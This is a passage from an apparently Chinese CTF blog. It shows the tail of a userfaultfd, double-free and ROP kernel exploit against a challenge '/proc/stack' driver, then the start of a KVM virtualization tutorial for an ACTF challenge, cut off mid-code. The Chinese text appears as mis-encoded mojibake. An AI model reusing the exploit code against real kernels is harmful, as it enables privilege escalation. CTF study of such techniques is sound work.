class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            errExit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                                              ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    saveStatus();</span><br><span class="line">    stack_fd=open(<span class="string">&quot;/proc/stack&quot;</span>,O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(!stack_fd)&#123;</span><br><span class="line">        errExit(<span class="string">&quot;/proc/stack open fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x200</span>;i++)&#123;</span><br><span class="line">        seq_fd[i]=open(<span class="string">&quot;/proc/self/stat&quot;</span>,O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span>(!seq_fd[i])&#123;</span><br><span class="line">            errExit(<span class="string">&quot;stat open fail&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    page_size=sysconf(_SC_PAGE_SIZE);</span><br><span class="line">    page=<span class="built_in">malloc</span>(page_size);</span><br><span class="line">    <span class="keyword">char</span> *leak_buf=mmap(<span class="literal">NULL</span>,page_size,PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    registerUserFaultFd(leak_buf,page_size,leak_handler_thread);</span><br><span class="line">    <span class="keyword">int</span> seq_leak_fd=open(<span class="string">&quot;/proc/self/stat&quot;</span>,O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(!seq_leak_fd)&#123;</span><br><span class="line">        errExit(<span class="string">&quot;leak_stat open fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(seq_leak_fd);</span><br><span class="line">    add(leak_buf);</span><br><span class="line"></span><br><span class="line">    add(<span class="string">&quot;rootroot&quot;</span>);</span><br><span class="line">    <span class="keyword">char</span> *doublefree_buf=mmap(<span class="literal">NULL</span>,page_size,PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    registerUserFaultFd(doublefree_buf,page_size,doublefree_handler_thread);</span><br><span class="line">    del(doublefree_buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *stat_rop_buf=mmap(<span class="literal">NULL</span>,page_size*<span class="number">2</span>,PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    registerUserFaultFd(stat_rop_buf+page_size,page_size,stat_rop_handler_thread);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(stat_rop_buf+page_size<span class="number">-8</span>)=add_rsp_0x1c8_pop_6_ret-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    stat_rop_fd=open(<span class="string">&quot;/proc/self/stat&quot;</span>,O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(!stat_rop_fd)&#123;</span><br><span class="line">        errExit(<span class="string">&quot;stat_rop_fd open fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    setxattr(<span class="string">&quot;/exp&quot;</span>, <span class="string">&quot;jingyinghua&quot;</span>, stat_rop_buf + page_size - <span class="number">8</span>, <span class="number">32</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>






























      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/14/KVM%E8%99%9A%E6%8B%9F%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%A4%8D%E7%8E%B0ACTF-mykvm/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/07/14/KVM%E8%99%9A%E6%8B%9F%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%A4%8D%E7%8E%B0ACTF-mykvm/" class="post-title-link" itemprop="url">KVMè™šæ‹ŸåŒ–å­¦ä¹ &å¤ç°ACTF mykvm</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-07-14 21:42:19" itemprop="dateCreated datePublished" datetime="2022-07-14T21:42:19+08:00">2022-07-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2022-07-19 01:12:30" itemprop="dateModified" datetime="2022-07-19T01:12:30+08:00">2022-07-19</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="KVMè™šæ‹ŸåŒ–å­¦ä¹ -amp-kvmé¢˜ç›®å¤ç°"><a href="#KVMè™šæ‹ŸåŒ–å­¦ä¹ -amp-kvmé¢˜ç›®å¤ç°" class="headerlink" title="KVMè™šæ‹ŸåŒ–å­¦ä¹ &amp;kvmé¢˜ç›®å¤ç°"></a>KVMè™šæ‹ŸåŒ–å­¦ä¹ &amp;kvmé¢˜ç›®å¤ç°</h1><h2 id="kvmè™šæ‹ŸåŒ–å­¦ä¹ "><a href="#kvmè™šæ‹ŸåŒ–å­¦ä¹ " class="headerlink" title="kvmè™šæ‹ŸåŒ–å­¦ä¹ "></a>kvmè™šæ‹ŸåŒ–å­¦ä¹ </h2><p>å¯¹æˆ‘è€Œè¨€ç°åœ¨å­¦ä¹ è¿™ä¸ªè¿˜æ˜¯æ¯”è¾ƒåƒåŠ›çš„ï¼Œæ¶‰åŠå¾ˆå¤æ‚çš„ä¸€äº›ç†è®ºçŸ¥è¯†ï¼Œçœ‹çš„äº‘é‡Œé›¾é‡Œ(å¤šåŠæ²¡çœ‹æ‡‚)ï¼Œè€Œä¸”èµ„æ–™ä¹Ÿä¸æ˜¯å¾ˆå¤šï¼Œçœ‹äº†ä¸€ä¸¤å¤©å¤§æ¦‚çœ‹æ‡‚äº†kvmçš„æ•´ä¸ªè¿è¡Œè¿‡ç¨‹ï¼Œè™½ç„¶å­¦çš„å¾ˆæµ…ï¼Œä½†æ˜¯åœ¨è¿™é‡Œè®°å½•ä¸€ä¸‹ã€‚</p>
<h3 id="kvmæ¦‚è¿°ä»¥åŠä½¿ç”¨"><a href="#kvmæ¦‚è¿°ä»¥åŠä½¿ç”¨" class="headerlink" title="kvmæ¦‚è¿°ä»¥åŠä½¿ç”¨"></a>kvmæ¦‚è¿°ä»¥åŠä½¿ç”¨</h3><p>kvmæ˜¯è¿è¡Œåœ¨Linuxå†…æ ¸ä¸­çš„ç¡¬ä»¶è™šæ‹ŸåŒ–ç®¡ç†æ¨¡å—ï¼Œç”¨æˆ·æ€çš„ç¨‹åºå¯ä»¥é€šè¿‡kvmæš´éœ²çš„ç”¨æˆ·æ€æ¥å£ä½¿ç”¨ç¡¬ä»¶è™šæ‹ŸåŒ–çš„åŠŸèƒ½,æˆ‘ä»¬å¯ä»¥é€šè¿‡è§„å®šçš„APIä»¥åŠæ•°æ®ç»“æ„å®ŒæˆCPUè™šæ‹ŸåŒ–ï¼Œå†…å­˜è™šæ‹ŸåŒ–ä»¥åŠIOè™šæ‹ŸåŒ–,ä»¥æ­¤æ¨¡æ‹Ÿå®Œæ•´çš„è™šæ‹Ÿç¯å¢ƒã€‚</p>
<p>å…ˆå†™ä¸€æ®µæˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„ä»£ç ,å…¶ä¸­æ¯”è¾ƒé‡è¦çš„æ˜¯<code>out</code>æŒ‡ä»¤ï¼Œè¿™ä¸ªæŒ‡ä»¤å°±æ˜¯æŠŠalä¿å­˜çš„æ•°æ®å‘é€åˆ°dxå‚¨å­˜çš„ioç«¯å£ä¸Šå»ï¼ŒCPUé€šå¸¸é€šè¿‡è¯»å†™è®¾å¤‡å¯„å­˜å™¨çš„æ–¹å¼å’Œè®¾å¤‡è¿›è¡Œé€šä¿¡ï¼Œè®¿é—®è®¾å¤‡å¯„å­˜å™¨çš„æ–¹å¼ä¸€å…±æœ‰ä¸¤ç§ï¼Œä¸€ç§æ˜¯å†…å­˜æ˜ å°„I/O(MMIO)ï¼Œä¸€ç§æ˜¯ç«¯å£æ˜ å°„I/O(PMIO),MMIOæ˜¯å°†è®¾å¤‡å¯„å­˜å™¨ç›´æ¥æ˜ å°„åˆ°å†…å­˜ç©ºé—´ä¸Šå¹¶ä¸”æ‹¥æœ‰ç‹¬ç«‹çš„åœ°å€ï¼ŒCPUå¯ä»¥ç›´æ¥é€šè¿‡è¯»å†™å†…å­˜æŒ‡ä»¤å³å¯é€šä¿¡ï¼Œè€ŒPMIOç»™æ¯ä¸ªè®¾å¤‡åˆ†é…å¯¹åº”çš„ç«¯å£å·ï¼Œç„¶åé€šè¿‡ä¸“é—¨çš„ç«¯å£æ“ä½œæŒ‡ä»¤(out/in)å’Œè®¾å¤‡é€šä¿¡ï¼Œè€Œ0x3f8åˆ™æ˜¯æ¨¡æ‹Ÿçš„ä¸€ä¸ªç«¯å£å·</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov al, 1</span><br><span class="line">add al,&#x27;0&#x27;</span><br><span class="line">mov dx, 0x3f8</span><br><span class="line">out dx, al</span><br><span class="line">hlt</span><br></pre></td></tr></table></figure>

<p>ç„¶åæŠŠè¿™ä¸ªæ±‡ç¼–ç»™ç¼–è¯‘äº†å†å¾—åˆ°äºŒè¿›åˆ¶æ•°æ®</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rootzhang@rootzhang-virtual-machine:~/kvmstudy/test1$ nasm huibian.asm -o huibian</span><br><span class="line">rootzhang@rootzhang-virtual-machine:~/kvmstudy/test1$ hexdump -C huibian</span><br><span class="line">00000000  b0 01 04 30 ba f8 03 ee  f4                       |...0.....|</span><br><span class="line">00000009</span><br></pre></td></tr></table></figure>

<p>ç„¶åæŠŠè¿™ä¸ªshellcodeå­˜å‚¨åˆ°ä¸€ä¸ªæ•°æ®é‡Œ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint8_t</span> code[]=&#123;</span><br><span class="line">     <span class="number">0xb0</span>,<span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x30</span>, <span class="number">0xba</span>, <span class="number">0xf8</span>, <span class="number">0x03</span>, <span class="number">0xee</span>,<span class="number">0xf4</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ¥ç€çœŸæ­£å¼€å§‹åˆ©ç”¨kvmçš„æ¥å£æ¥åˆ›å»ºè™šæ‹Ÿæœºç„¶åè¿è¡Œè¿™æ®µshellcode.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kvm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">uint8_t</span> code[]=&#123;</span><br><span class="line">         <span class="number">0xb0</span>,<span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x30</span>, <span class="number">0xba</span>, <span class="number">0xf8</span>, <span class="number">0x03</span>, <span class="number">0xee</span>,<span class="number">0xf4</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//æ‰“å¼€/dev/kvm,è·å¾—kvmçš„å¥æŸ„</span></span><br><span class="line">    <span class="keyword">int</span> kvm=open(<span class="string">&quot;/dev/kvm&quot;</span>,O_RDWR|O_CLOEXEC);</span><br><span class="line">    <span class="comment">//æ—©èµ·çš„kvmçš„APIæ˜¯ä¸ç¨³å®šçš„ï¼Œæ‰€ä»¥å¾—æ£€æŸ¥ä¸€ä¸‹ç‰ˆæœ¬ï¼Œå¦‚æœæ˜¯</span></span><br><span class="line">    <span class="comment">//12é‚£å°±æ²¡é—®é¢˜</span></span><br><span class="line">    ret=ioctl(kvm,KVM_GET_API_VERSION,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;KVM_GET_API_VERSION get fail&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(ret!=<span class="number">12</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;KVM_GET_API_VERSION is not 12&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//åˆ›å»ºä¸€ä¸ªè™šæ‹Ÿæœº(vm),ä»–ä»£è¡¨äº†ä¸€ä¸ªæ¨¡æ‹Ÿç³»ç»Ÿç›¸å…³çš„æ‰€æœ‰å†…å®¹ï¼ŒåŒ…æ‹¬</span></span><br><span class="line">    <span class="comment">//å†…å­˜å’Œä¸€ä¸ªæˆ–è€…å¤šä¸ªCPUï¼Œ</span></span><br><span class="line">    <span class="keyword">int</span> vmfd=ioctl(kvm,KVM_CREATE_VM,(<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(vmfd==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;KVM_CREATE_VM fail&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//ä¸ºvmé…ç½®â€œç‰©ç†â€å†…å­˜</span></span><br><span class="line">    <span class="keyword">void</span> *mem=mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(!mem)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;mmap mem fail&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(mem,code,<span class="keyword">sizeof</span>(code));</span><br><span class="line">    <span class="comment">//è¿™ä¸ªæ•°æ®ç»“æ„è§„å®šäº†å®¢æˆ·ç‰©ç†åœ°å€å’Œå®¿ä¸»è¿›ç¨‹çš„æ˜ å°„å…³ç³»,æ˜¯æ¯”è¾ƒé‡è¦çš„</span></span><br><span class="line">    <span class="comment">//å…¶ä¸­guest_phys_addræŒ‡å®šäº†ä»guestçœ‹åˆ°çš„&quot;ç‰©ç†&quot;åœ°å€ï¼Œè€Œuserspace_addr</span></span><br><span class="line">    <span class="comment">//æ˜¯å®¿ä¸»è¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ï¼Œå¯ä»¥çœ‹å‡ºè¿™ä¸ªæ˜¯ä¸ªçº¿æ€§æ˜ å°„ï¼ŒæŠŠmemæ˜ å°„åˆ°guestçš„0x1000</span></span><br><span class="line">    <span class="comment">//çš„â€œç‰©ç†â€åœ°å€ä¸Šï¼Œæ‰€ä»¥memå’Œguestçš„0x1000æŒ‡å‘åˆ°çœŸå®ç‰©ç†åœ°å€æ˜¯ä¸€æ¨¡ä¸€æ ·çš„ï¼Œæ‰€ä»¥guestä¿®æ”¹</span></span><br><span class="line">    <span class="comment">//ä»–çš„å†…å­˜æ˜¯å¯ä»¥å½±å“åˆ°å®¿ä¸»è¿›ç¨‹çš„ï¼Œè¿™ä¹Ÿæ˜¯é€ƒé€¸çš„æ¼æ´ç‚¹ã€‚</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kvm_userspace_memory_region</span> <span class="title">region</span>=</span>&#123;</span><br><span class="line">        .slot=<span class="number">0</span>,</span><br><span class="line">        .guest_phys_addr=<span class="number">0x1000</span>,</span><br><span class="line">        .memory_size=<span class="number">0x1000</span>,</span><br><span class="line">        .userspace_addr=(<span class="keyword">uint64_t</span>)mem,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//ç„¶åè®¾ç½®vmçš„å†…å­˜åŒºåŸŸ</span></span><br><span class="line">    ret=ioctl(vmfd,KVM_SET_USER_MEMORY_REGION,&amp;region);</span><br><span class="line">    <span class="keyword">if</span>(ret==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;KVM_SET_USER_MEMORY_REGION fail&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//æˆªè‡³ç›®å‰å·²ç»æ‹¥æœ‰äº†vmå’Œä»–æ‰€å¯¹åº”çš„å†…å­˜ï¼Œé‡Œé¢åŒ…å«äº†ä»£ç ï¼Œè¦æƒ³æ‰§è¡Œè¿™æ®µä»£ç è¿˜å¾—æ¨¡æ‹Ÿ</span></span><br><span class="line">    <span class="comment">//ä¸€ä¸ªè™šæ‹ŸCPU(VCPU),ä¸€ä¸ªè™šæ‹Ÿcpuä»£è¡¨äº†ä¸€ä¸ªæ¨¡æ‹ŸCPUçš„çŠ¶æ€ï¼ŒåŒ…æ‹¬å¤„ç†å™¨å¯„å­˜å™¨å’Œå…¶ä»–</span></span><br><span class="line">    <span class="comment">//æ‰§è¡ŒçŠ¶æ€,kvmæä¾›ä¸€ä¸ªvcpuçš„å¥æŸ„</span></span><br><span class="line">    <span class="keyword">int</span> vcpufd=ioctl(vmfd,KVM_CREATE_VCPU,(<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(vcpufd==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;KVM_CREATE_VCPU fail&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//æ¯ä¸ªvcpuéƒ½å¾—å…³è”ä¸€ä¸ªstruct kvm_runæ•°æ®ç»“æ„ï¼Œç”¨äºåœ¨vmå’Œå®¿ä¸»è¿›ç¨‹(æˆ‘ç†è§£ä¸ºè™šæ‹Ÿæœºç›‘å¬å™¨)</span></span><br><span class="line">    <span class="comment">//ä¼ é€’æœ‰å…³cpuçš„ä¿¡æ¯ï¼Œç‰¹åˆ«æ˜¯å½“vmexitçš„æ—¶å€™ï¼Œkvm_runè®²åŒ…å«æœ‰å…³ä»–åœæ­¢çš„ä¿¡æ¯ï¼Œå¯ä»¥æ ¹æ®è¿™ä¸ª</span></span><br><span class="line">    <span class="comment">//ä¿¡æ¯åšç›¸åº”çš„å¤„ç†æ“ä½œ</span></span><br><span class="line">    <span class="keyword">size_t</span> kvm_run_size=ioctl(kvm,KVM_GET_VCPU_MMAP_SIZE,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span>(!kvm_run_size)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;KVM_GET_VCPU_MMAP_SIZE fail&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//ç„¶åå°†kvm_runå’Œvcpuå…³è”</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kvm_run</span> *<span class="title">run</span>=</span>mmap(<span class="literal">NULL</span>,kvm_run_size,PROT_READ | PROT_WRITE, MAP_SHARED, vcpufd, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//åœ¨æ‰§è¡Œä»£ç ä¹‹å‰è¿˜éœ€è¦è®¾ç½®vcpuçš„å¯„å­˜å™¨çš„åˆå§‹çŠ¶æ€ï¼Œå¯„å­˜å™¨åˆ†ä¸ºæ ‡å‡†å¯„å­˜å™¨å’Œç‰¹æ®Šå¯„å­˜å™¨ï¼Œæ ‡å‡†</span></span><br><span class="line">    <span class="comment">//å¯„å­˜å™¨æŒ‡çš„æ˜¯é€šç”¨å¯„å­˜å™¨ä»¥åŠæŒ‡é’ˆå’Œæ ‡å¿—ï¼Œkvmä¸­é‡‡ç”¨struct kvm_regsæ•°æ®ç»“æ„ä¸å…¶å¯¹åº”ï¼Œç‰¹æ®Šå¯„å­˜å™¨</span></span><br><span class="line">    <span class="comment">//ä¸»è¦åŒ…æ‹¬æ®µå¯„å­˜å™¨å’Œæ§åˆ¶å¯„å­˜å™¨,kvmä¸­é‡‡ç”¨struct kvm_sregsæ•°æ®ç»“æ„ä¸å…¶å¯¹åº”</span></span><br><span class="line">    <span class="comment">//ç‰¹æ®Šå¯„å­˜å™¨ä¸­ï¼Œæˆ‘ä»¬åªéœ€è¦è®¾ç½®cså¯„å­˜å™¨å³å¯</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kvm_sregs</span> <span class="title">sregs</span>;</span></span><br><span class="line">    ret=ioctl(vcpufd,KVM_GET_SREGS,&amp;sregs);</span><br><span class="line">    <span class="keyword">if</span>(ret==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;KVM_GET_SREGS fail&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sregs.cs.base = <span class="number">0</span>;</span><br><span class="line">    sregs.cs.selector = <span class="number">0</span>;</span><br><span class="line">    ret=ioctl(vcpufd,KVM_SET_SREGS,&amp;sregs);</span><br><span class="line">    <span class="keyword">if</span>(ret==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;KVM_SET_SREGS fail&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//è®¾ç½®æ ‡å‡†å¯„å­˜å™¨ï¼Œå…¶ä¸­æ¯”è¾ƒé‡è¦çš„æ˜¯ripå’Œrflagså¯„å­˜å™¨ï¼ŒripæŒ‡å‘</span></span><br><span class="line">    <span class="comment">//codeå­˜æ”¾çš„åœ°å€ï¼ŒrflagsæŒ‡å®šä¸º2</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kvm_regs</span> <span class="title">regs</span>=</span></span><br><span class="line">    &#123;</span><br><span class="line">        .rip=<span class="number">0x1000</span>,</span><br><span class="line">        .rax=<span class="number">1</span>,</span><br><span class="line">        .rflags=<span class="number">0x2</span>,</span><br><span class="line"></span><br><span class="line">    &#125;;</span><br><span class="line">    ret=ioctl(vcpufd,KVM_SET_REGS,&amp;regs);</span><br><span class="line">    <span class="keyword">if</span>(ret==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;KVM_SET_REGS fail&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span 